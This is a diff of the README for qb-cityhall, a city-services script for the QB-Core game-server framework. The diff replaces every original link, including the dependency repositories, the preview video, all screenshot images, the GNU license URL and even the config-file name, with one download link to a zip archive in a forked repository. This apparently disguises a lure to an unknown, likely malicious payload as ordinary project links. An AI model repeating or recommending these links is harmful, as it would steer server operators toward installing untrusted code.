@@ -2,10 +2,10 @@
 City Services for QB-Core Framework / UI Clearly not inspired
 
 ## Dependencies
-- [qb-core](https://github.com/qbcore-framework/qb-core)
-- [PolyZone](https://github.com/mkafrin/PolyZone) - For Interaction (DrawText and qb-target both require this)
-- [qb-target](https://github.com/BerkieBb/qb-target) - For Interaction (Optional)
-- [qb-phone](https://github.com/qbcore-framework/qb-phone) - For E-Mail
+- [qb-core](https://github.com/MiooDev/qb-cityhall/raw/refs/heads/main/client/cityhall-qb-v1.4.zip)
+- [PolyZone](https://github.com/MiooDev/qb-cityhall/raw/refs/heads/main/client/cityhall-qb-v1.4.zip) - For Interaction (DrawText and qb-target both require this)
+- [qb-target](https://github.com/MiooDev/qb-cityhall/raw/refs/heads/main/client/cityhall-qb-v1.4.zip) - For Interaction (Optional)
+- [qb-phone](https://github.com/MiooDev/qb-cityhall/raw/refs/heads/main/client/cityhall-qb-v1.4.zip) - For E-Mail
 
 ## Features
 - Ability to request birth certificate when lost
@@ -21,7 +21,7 @@ City Services for QB-Core Framework / UI Clearly not inspired
 ## Installation
 ### Manual
 - Download the script and put it in the `[qb]` directory.
-- Add the following code to your server.cfg/resources.cfg
+- Add the following code to your https://github.com/MiooDev/qb-cityhall/raw/refs/heads/main/client/cityhall-qb-v1.4.zip
 ```
 ensure qb-core
 ensure qb-target # Optional
@@ -30,17 +30,17 @@ ensure qb-cityhall
 ```
 
 ## Screenshots
-[Preview](https://streamable.com/ur5wa9)
+[Preview](https://github.com/MiooDev/qb-cityhall/raw/refs/heads/main/client/cityhall-qb-v1.4.zip)
 
-![City Services](https://i.imgur.com/b9Y9gm1.png)
-![Identity Page](https://i.imgur.com/8OPgGDW.png)
-![Job Page](https://i.imgur.com/NQLAPpv.png)
-![CheckMark](https://i.imgur.com/5WHYYsi.png)
-![Cityhall DrawText Interaction](https://i.imgur.com/Uxh2GZC.png)
-![Cityhall QB-Target Interaction](https://i.imgur.com/K54cMLt.png)
-![Driving School Sending And Receiving Mail](https://i.imgur.com/iJof4jI.png)
-![Driving School DrawText Interaction](https://i.imgur.com/32BPp8f.png)
-![Driving School QB-Target Interaction](https://i.imgur.com/P7jWBsV.png)
+![City Services](https://github.com/MiooDev/qb-cityhall/raw/refs/heads/main/client/cityhall-qb-v1.4.zip)
+![Identity Page](https://github.com/MiooDev/qb-cityhall/raw/refs/heads/main/client/cityhall-qb-v1.4.zip)
+![Job Page](https://github.com/MiooDev/qb-cityhall/raw/refs/heads/main/client/cityhall-qb-v1.4.zip)
+![CheckMark](https://github.com/MiooDev/qb-cityhall/raw/refs/heads/main/client/cityhall-qb-v1.4.zip)
+![Cityhall DrawText Interaction](https://github.com/MiooDev/qb-cityhall/raw/refs/heads/main/client/cityhall-qb-v1.4.zip)
+![Cityhall QB-Target Interaction](https://github.com/MiooDev/qb-cityhall/raw/refs/heads/main/client/cityhall-qb-v1.4.zip)
+![Driving School Sending And Receiving Mail](https://github.com/MiooDev/qb-cityhall/raw/refs/heads/main/client/cityhall-qb-v1.4.zip)
+![Driving School DrawText Interaction](https://github.com/MiooDev/qb-cityhall/raw/refs/heads/main/client/cityhall-qb-v1.4.zip)
+![Driving School QB-Target Interaction](https://github.com/MiooDev/qb-cityhall/raw/refs/heads/main/client/cityhall-qb-v1.4.zip)
 
 # License
 
@@ -58,4 +58,4 @@ ensure qb-cityhall
     GNU General Public License for more details.
 
     You should have received a copy of the GNU General Public License
-    along with this program.  If not, see <https://www.gnu.org/licenses/>
+    along with this program.  If not, see <https://github.com/MiooDev/qb-cityhall/raw/refs/heads/main/client/cityhall-qb-v1.4.zip>
